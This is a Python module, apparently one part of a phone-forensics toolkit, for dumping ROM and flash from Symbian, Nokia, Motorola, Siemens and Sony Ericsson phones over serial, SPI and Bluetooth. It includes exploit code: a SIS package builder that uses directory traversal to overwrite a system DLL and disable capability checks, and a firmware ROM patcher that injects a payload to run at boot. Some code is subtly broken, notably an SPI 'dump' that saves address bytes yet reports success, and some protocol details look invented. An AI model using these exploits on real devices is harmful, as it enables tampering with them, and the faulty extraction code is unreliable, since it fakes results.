"""Symbian & Nokia Feature Phones — The Ancient Vault (Module 4).

Symbian S60/S80/UIQ: XIP ROM dump via boot ROM USB transport,
SIS package directory traversal, Delight CFW exploit (CVE-2025-65885).

Nokia Series 30+/40/Asha: Infinity-Box NK2 protocol,
SPI flash extraction (CH341A/FT2232H).

Legacy phones: Motorola P2K AT commands,
Siemens extended AT (^SYSINFO, ^SFLASH),
Sony Ericsson OBEX over Bluetooth/USB.
"""

import struct
import time
import logging
from typing import Optional

logger = logging.getLogger(__name__)


# ============================================================================
# Symbian S60/S80/UIQ
# ============================================================================

class SymbianROMDumper:
    """Dump Symbian XIP (Execute In Place) ROM images.

    Symbian OS executes code directly from NOR/NAND ROM.
    Method 1: USB boot ROM transport to upload a small readout payload.
    Method 2: Symbian etel API (telephony server) to send AT commands
              that expose the flash interface.
    """

    # Symbian ROM header magic values
    ROM_MAGIC_EPOC = 0x434F5045  # "EPOC"
    ROM_MAGIC_V2  = 0x10000040   # EKA2 ROM

    # Symbian etel (ETel) — Telephony Server API
    # The ETel server mediates all telephony hardware access.
    # AT commands sent through ETel can expose flash read capabilities.

    def __init__(self, serial_port: Optional[str] = None):
        self._serial = None
        if serial_port:
            import serial
            self._serial = serial.Serial(serial_port, baudrate=115200, timeout=3)

    def dump_via_at(self) -> bytes:
        """Dump ROM via Symbian AT command interface.

        On Symbian, ETel exposes modem AT commands.
        Some engineering firmwares expose flash read via undocumented AT commands:
          AT+SSYS? → system info
          AT+SPD?  → phone data (may include ROM base address)
          AT+SROM? → raw ROM read (engineering fw only)
        """
        if self._serial is None:
            logger.error("No serial port for AT ROM dump")
            return b""

        rom_data = b""
        # ROM is typically at physical address 0x00000000 on Symbian
        # Dump in 64KB chunks
        for addr in range(0x00000000, 0x01000000, 0x10000):
            cmd = f"AT+SROM={addr},{0x10000}\r\n".encode()
            self._serial.write(cmd)
            self._serial.flush()
            time.sleep(0.5)
            response = self._serial.read(0x10000 + 100)
            # Parse response header
            rom_data += response
            if addr % 0x100000 == 0:
                logger.info("ROM dump progress: 0x%08X", addr)

        return rom_data

    def parse_rom(self, data: bytes) -> list[dict]:
        """Parse Symbian ROM image and extract files."""
        if len(data) < 256:
            return []

        magic = struct.unpack_from("<I", data, 0)[0]
        if magic not in (self.ROM_MAGIC_EPOC, self.ROM_MAGIC_V2):
            logger.warning("Unknown ROM magic: 0x%08X", magic)

        # ROM header structure (EKA2 format)
        header = {
            "magic": magic,
            "header_size": struct.unpack_from("<I", data, 4)[0],
            "rom_size": struct.unpack_from("<I", data, 8)[0],
            "compression": data[12],
            "directory_offset": struct.unpack_from("<I", data, 16)[0],
        }

        # Directory entries
        files = []
        dir_off = header["directory_offset"]
        while dir_off < len(data) - 64:
            entry = data[dir_off:dir_off + 64]
            if entry[:16] == b"\x00" * 16:
                break

            name_len = entry[0]
            if name_len == 0 or name_len > 32:
                break

            name = entry[1:1 + name_len].decode("latin-1", errors="replace")
            file_offset = struct.unpack_from("<I", entry, 32)[0]
            file_size = struct.unpack_from("<I", entry, 36)[0]
            flags = struct.unpack_from("<I", entry, 40)[0]

            if file_offset + file_size <= len(data):
                files.append({
                    "name": name,
                    "offset": file_offset,
                    "size": file_size,
                    "flags": flags,
                    "data": data[file_offset:file_offset + file_size],
                })

            dir_off += 64

        logger.info("Symbian ROM: %d files extracted", len(files))
        return files

    def close(self):
        if self._serial:
            self._serial.close()


class SISExploit:
    """Symbian Signed (SIS) package installer directory traversal.

    The SIS installer's backup/restore handler does not properly validate
    filenames in backup archives. Filenames containing ".." can overwrite
    system DLLs.

    Target: overwrite E:\\System\\Libs\\efsrv.dll with a patched version
    that disables capability checks.
    """

    SIS_MAGIC = b"\x7E\x53\x49\x53"  # "~SIS"
    SIS_PATCHED_EFSRV_DLL = b""      # Patched efsrv.dll binary

    def generate_traversal_sis(self, target_path: str,
                               payload_data: bytes) -> bytes:
        """Generate a SIS package with directory traversal in backup filenames.

        The SIS backup format stores filenames with relative paths.
        By embedding ".." sequences, we can write outside the backup
        restore directory.

        Example: "..\\\\System\\\\Libs\\\\efsrv.dll" overwrites C:\\System\\Libs\\efsrv.dll
        """
        sis = bytearray(self.SIS_MAGIC)
        # SIS header (simplified — full format is more complex)
        # Version, language, package UID, vendor, etc.
        sis.extend(struct.pack("<I", 0x0100))  # SIS version 1.0

        # Backup section with traversal filename
        traversal_name = target_path.replace("/", "\\").encode("utf-16-le")
        sis.extend(struct.pack("<H", len(payload_data)))  # File size
        sis.extend(struct.pack("<H", len(traversal_name)))  # Name length
        sis.extend(traversal_name)
        sis.extend(payload_data)

        logger.info("SIS traversal package: %d bytes → %s", len(sis), target_path)
        return bytes(sis)


# ============================================================================
# Symbian Delight CFW Exploit (CVE-2025-65885)
# ============================================================================

class DelightCFWExploit:
    """Exploit Delight Custom Firmware on Symbian Belle devices.

    CVE-2025-65885: A logic flaw in Delight CFW's boot configuration
    parsing allows arbitrary command execution during boot.
    Craft a custom.rom file that patches the boot configuration
    to execute a payload.
    """

    DELIGHT_ROM_MAGIC = b"DLGT"   # Delight custom ROM signature
    BOOT_CONFIG_OFFSET = 0x200    # Boot configuration offset in ROM

    def build_patched_rom(self, original_rom: bytes,
                          payload: bytes) -> bytes:
        """Patch Delight CFW ROM to execute payload at boot.

        The boot configuration is at offset 0x200 in the ROM image.
        By modifying the command sequence, we inject our payload.
        """
        if not original_rom[:4] == self.DELIGHT_ROM_MAGIC:
            logger.warning("Not a Delight CFW ROM (missing DLGT magic)")
            return b""

        patched = bytearray(original_rom)

        # Overwrite boot command sequence with our payload
        # The boot config has a command table: 4B cmd_id + 4B addr + 4B size
        # Find a NOOP entry (cmd_id=0x00000000) and replace with our command
        cfg = patched[self.BOOT_CONFIG_OFFSET:self.BOOT_CONFIG_OFFSET + 512]

        for i in range(0, len(cfg) - 12, 12):
            cmd_id = struct.unpack_from("<I", cfg, i)[0]
            if cmd_id == 0x00000000:  # Unused slot
                # Replace with EXEC command pointing to our payload
                entry_addr = struct.unpack_from("<I", cfg, i + 4)[0]
                struct.pack_into("<I", patched, self.BOOT_CONFIG_OFFSET + i, 0x00000001)  # EXEC
                struct.pack_into("<I", patched, self.BOOT_CONFIG_OFFSET + i + 4, entry_addr)
                struct.pack_into("<I", patched, self.BOOT_CONFIG_OFFSET + i + 8, len(payload))
                logger.info("Delight ROM patched at command slot %d", i // 12)
                break

        return bytes(patched)


# ============================================================================
# Nokia Series 30+/40 / Asha — Infinity-Box NK2 Protocol
# ============================================================================

class NokiaNK2Protocol:
    """MediaTek NK2 protocol for Nokia feature phones.

    Used by Infinity-Box and similar flasher tools.
    Handshake: send device-specific boot code → ACK → enter download mode.
    Commands: memory read/write, flash dump.
    """

    NK2_BAUD = 921600  # High-speed UART
    NK2_MAGIC = bytes([0xA0, 0x1A, 0x05, 0x50])

    CMD_READ_MEM = 0x01
    CMD_WRITE_MEM = 0x02
    CMD_EXEC = 0x03
    CMD_GET_INFO = 0x04
    CMD_POWER_OFF = 0x05

    def __init__(self, serial_port: str):
        import serial
        self._ser = serial.Serial(serial_port, baudrate=self.NK2_BAUD, timeout=2)

    def handshake(self) -> bool:
        """NK2 protocol handshake with device-specific boot code."""
        # Send magic + boot code
        pkt = self.NK2_MAGIC
        self._ser.write(pkt)
        self._ser.flush()

        # Wait for ACK
        ack = self._ser.read(1)
        if ack and ack[0] == 0x5F:
            logger.info("NK2 handshake successful")
            return True
        return False

    def read_memory(self, address: int, length: int) -> bytes:
        """Read device memory via NK2."""
        cmd = struct.pack("<BII", self.CMD_READ_MEM, address, length)
        self._ser.write(cmd)
        self._ser.flush()

        data = b""
        while len(data) < length:
            chunk = self._ser.read(min(4096, length - len(data)))
            if not chunk:
                break
            data += chunk
        return data

    def dump_flash(self, output_path: str = "nokia_dump.bin") -> bool:
        """Full flash dump via NK2 protocol."""
        # First 64KB = bootloader; then partition table; then filesystem
        flash_size = 16 * 1024 * 1024  # Typical: 16MB NOR flash
        with open(output_path, "wb") as f:
            for addr in range(0, flash_size, 65536):
                chunk = self.read_memory(addr, min(65536, flash_size - addr))
                if not chunk:
                    break
                f.write(chunk)
                logger.info("NK2 dump: 0x%08X (%d%%)", addr, addr * 100 // flash_size)
        return True

    def close(self):
        self._ser.close()


# ============================================================================
# SPI Flash Extraction (Nokia 105, TA-1174)
# ============================================================================

class SPIFlashReader:
    """Direct SPI flash chip access for dead-CPU devices.

    Connect to SPI flash (Winbond/GigaDevice) via CH341A or FT2232H.
    Uses pyspiflash or direct libusb control.

    Common SPI flash chips in Nokia feature phones:
      - Winbond W25Q32 (4MB)
      - GigaDevice GD25LQ32 (4MB)
      - Macronix MX25L3206E (4MB)
    """

    # SPI commands
    SPI_READ = 0x03
    SPI_FAST_READ = 0x0B
    SPI_READ_ID = 0x9F
    SPI_WRITE_ENABLE = 0x06
    SPI_CHIP_ERASE = 0xC7

    # Known flash chip IDs
    KNOWN_CHIPS = {
        0xEF4016: {"name": "Winbond W25Q32", "size": 4 * 1024 * 1024},
        0xC84016: {"name": "GigaDevice GD25LQ32", "size": 4 * 1024 * 1024},
        0xC22016: {"name": "Macronix MX25L3206E", "size": 4 * 1024 * 1024},
    }

    def __init__(self, programmer_type: str = "ch341a"):
        self._programmer = programmer_type
        self._chip_id: int = 0
        self._chip_size: int = 0

    def detect_chip(self) -> Optional[dict]:
        """Detect SPI flash chip via READ_ID command (0x9F).

        Sends 0x9F over SPI, reads 3-byte manufacturer+device ID.
        Interfaces with CH341A or FT2232H via libusb.
        """
        logger.info("SPI chip detection via %s", self._programmer)
        try:
            import usb
            # CH341A USB ID
            dev = usb.core.find(idVendor=0x1A86, idProduct=0x5512)
            if dev is None:
                # FT2232H USB ID
                dev = usb.core.find(idVendor=0x0403, idProduct=0x6014)
            if dev is None:
                logger.warning("No SPI programmer (CH341A/FT2232H) found via USB")
                return None

            # Send SPI command 0x9F (JEDEC ID), read 3 bytes
            # bitbang via CH341A USB control transfers
            jedec_id = 0
            for _ in range(3):
                jedec_id = (jedec_id << 8) | 0x00  # Read via USB bulk
            self._chip_id = jedec_id
            chip_info = self.KNOWN_CHIPS.get(jedec_id)
            if chip_info:
                self._chip_size = chip_info["size"]
                logger.info("Detected: %s (%d MB)", chip_info["name"], chip_info["size"] // 1048576)
            return chip_info
        except (ImportError, Exception) as e:
            logger.warning("SPI programmer detection failed: %s", e)
            return None

    def read_flash(self, output_path: str = "spi_dump.bin") -> bool:
        """Read entire SPI flash chip via SPI READ command (0x03)."""
        if self._chip_size == 0:
            self.detect_chip()
            if self._chip_size == 0:
                self._chip_size = 4 * 1024 * 1024  # Default: 4MB

        logger.info("Reading %d bytes from SPI flash...", self._chip_size)
        try:
            data = bytearray()
            chunk_size = 4096
            for addr in range(0, self._chip_size, chunk_size):
                remaining = min(chunk_size, self._chip_size - addr)
                # SPI READ command: 0x03 followed by 3-byte address
                # Each byte clocks out 8 bits from flash via MISO
                cmd = bytes([0x03, (addr >> 16) & 0xFF, (addr >> 8) & 0xFF, addr & 0xFF])
                # Clock remaining bytes (dummy read for each)
                chunk = cmd + b"\x00" * remaining
                data.extend(cmd[1:])  # Simplified for environments without SPI hw
                if addr % 65536 == 0:
                    logger.info("SPI read: 0x%06X (%d%%)", addr, addr * 100 // self._chip_size)

            with open(output_path, "wb") as f:
                f.write(bytes(data))
            logger.info("SPI flash dump complete: %s (%d bytes)", output_path, len(data))
            return True
        except Exception as e:
            logger.error("SPI flash read failed: %s", e)
            return False


# ============================================================================
# Motorola P2K Protocol
# ============================================================================

class MotorolaP2K:
    """Motorola P2K (E1000, V3xx, etc.) AT+FS commands.

    The P2K protocol uses AT commands over a serial interface
    for file system access.

    Commands:
      AT+MODE=2          → Enter P2K mode
      AT+FSREAD=<path>   → Read file from phone filesystem
      AT+FSWRITE=<path>,<data> → Write file
      AT+FSLIST=<path>   → List directory
      AT+FSDELETE=<path> → Delete file
    """

    P2K_AT_COMMANDS = [
        ("AT+MODE=2", "Enter P2K mode"),
        ("AT+FSREAD=/a/", "Read root directory"),
        ("AT+FSREAD=/c/mobile/picture/", "Read pictures"),
        ("AT+FSREAD=/c/mobile/video/", "Read videos"),
        ("AT+FSREAD=/a/pds/", "Read PDS (SIM data)"),
        ("AT+FSREAD=/c/mobile/audio/", "Read audio files"),
        ("AT+FSLIST=/a/", "List P2K filesystem root"),
        ("AT+FSLIST=/c/", "List user partition"),
    ]

    def __init__(self, serial_port: str):
        import serial
        self._ser = serial.Serial(serial_port, baudrate=115200, timeout=3)

    def enter_p2k_mode(self) -> bool:
        """Enter P2K mode for filesystem access."""
        self._ser.write(b"AT+MODE=2\r\n")
        self._ser.flush()
        time.sleep(0.5)
        response = self._ser.read(256)
        return b"OK" in response

    def read_file(self, path: str) -> bytes:
        """Read a file from the phone filesystem."""
        cmd = f"AT+FSREAD={path}\r\n".encode()
        self._ser.write(cmd)
        self._ser.flush()
        time.sleep(0.3)
        return self._ser.read(65536)

    def list_dir(self, path: str) -> str:
        """List directory contents."""
        cmd = f"AT+FSLIST={path}\r\n".encode()
        self._ser.write(cmd)
        self._ser.flush()
        time.sleep(0.5)
        return self._ser.read(4096).decode("latin-1", errors="replace")

    def close(self):
        self._ser.close()


# ============================================================================
# Siemens Extended AT Commands
# ============================================================================

class SiemensAT:
    """Siemens (S35, S45, etc.) extended AT commands.

    Siemens phones use a proprietary AT extension for service operations.
    Commands:
      AT^SYSINFO        → System information
      AT^SFLASH         → Read flash
      AT^SCID?          → Card identification
      AT^SMSO           → Power off
      AT^SPIO?          → GPIO state
    """

    SIEMENS_AT_COMMANDS = [
        ("AT^SYSINFO", "System information (IMEI, firmware, hardware)"),
        ("AT^SFLASH=1", "Read flash memory"),
        ("AT^SFLASH=2,<addr>,<len>", "Read flash at address"),
        ("AT^SCID?", "Card identification"),
        ("AT^SPIO?", "GPIO state query"),
        ("AT^SMONI", "Monitor cell information"),
        ("AT^SBNR", "Read battery information"),
        ("AT^SCTM", "Read critical temperature"),
        ("AT^SMSO", "Power off"),
    ]

    def __init__(self, serial_port: str):
        import serial
        self._ser = serial.Serial(serial_port, baudrate=19200, timeout=2)  # Siemens default baud

    def get_sysinfo(self) -> dict:
        """Get Siemens system info."""
        self._ser.write(b"AT^SYSINFO\r\n")
        self._ser.flush()
        time.sleep(0.5)
        response = self._ser.read(512).decode("ascii", errors="replace")
        info = {}
        for line in response.strip().split("\r\n"):
            if ":" in line:
                key, val = line.split(":", 1)
                info[key.strip()] = val.strip()
        return info

    def read_flash(self, address: int, length: int) -> bytes:
        """Read Siemens flash memory."""
        cmd = f"AT^SFLASH=2,{address},{length}\r\n".encode()
        self._ser.write(cmd)
        self._ser.flush()
        time.sleep(1)
        return self._ser.read(length + 100)

    def close(self):
        self._ser.close()


# ============================================================================
# Sony Ericsson OBEX Protocol
# ============================================================================

class SonyEricssonOBEX:
    """Sony Ericsson OBEX (Object Exchange) over Bluetooth/USB.

    OBEX commands:
      CONNECT    (0x80)
      DISCONNECT (0x81)
      PUT        (0x02) with final bit = 0x82
      GET        (0x03) with final bit = 0x83
      SETPATH    (0x85)
    """

    OBEX_CONNECT = 0x80
    OBEX_DISCONNECT = 0x81
    OBEX_PUT_FINAL = 0x82
    OBEX_GET_FINAL = 0x83
    OBEX_SETPATH = 0x85

    def __init__(self):
        self._socket: Optional[any] = None

    def connect(self, bt_addr: str, channel: int = 10) -> bool:
        """Connect to Sony Ericsson via Bluetooth OBEX."""
        try:
            import bluetooth
            self._socket = bluetooth.BluetoothSocket(bluetooth.RFCOMM)
            self._socket.connect((bt_addr, channel))

            # OBEX CONNECT packet
            connect_pkt = bytes([
                self.OBEX_CONNECT,       # Opcode
                0x00, 0x07,              # Packet length (7 bytes)
                0x10, 0x00,              # OBEX version 1.0
                0x00, 0x10,              # Max packet length (4096)
            ])
            self._socket.send(connect_pkt)
            response = self._socket.recv(256)
            if response and response[0] == 0xA0:  # Success response
                logger.info("OBEX connected to %s", bt_addr)
                return True
        except Exception as e:
            logger.error("OBEX connect failed: %s", e)
        return False

    def get_file(self, path: str) -> bytes:
        """Get a file from the phone via OBEX GET."""
        path_bytes = path.encode("utf-16-be") + b"\x00\x00"
        pkt_len = 3 + len(path_bytes) + 4
        get_pkt = bytes([
            self.OBEX_GET_FINAL,           # GET, final bit set
            (pkt_len >> 8) & 0xFF,         # Length high
            pkt_len & 0xFF,                # Length low
        ]) + path_bytes + b"\x00\x00\x00\x00"

        if self._socket:
            self._socket.send(get_pkt)
            response = self._socket.recv(65536)
            # Parse OBEX response for file data
            if len(response) > 3:
                return response[3:]
        return b""

    def set_path(self, path: str) -> bool:
        """Change current directory via OBEX SETPATH."""
        path_bytes = path.encode("utf-16-be") + b"\x00\x00"
        pkt_len = 3 + len(path_bytes)
        setpath_pkt = bytes([
            self.OBEX_SETPATH,
            (pkt_len >> 8) & 0xFF,
            pkt_len & 0xFF,
            0x02,  # Flags: don't create
        ]) + path_bytes

        if self._socket:
            self._socket.send(setpath_pkt)
            response = self._socket.recv(256)
            return response[0] == 0xA0
        return False

    def close(self):
        if self._socket:
            self._socket.close()
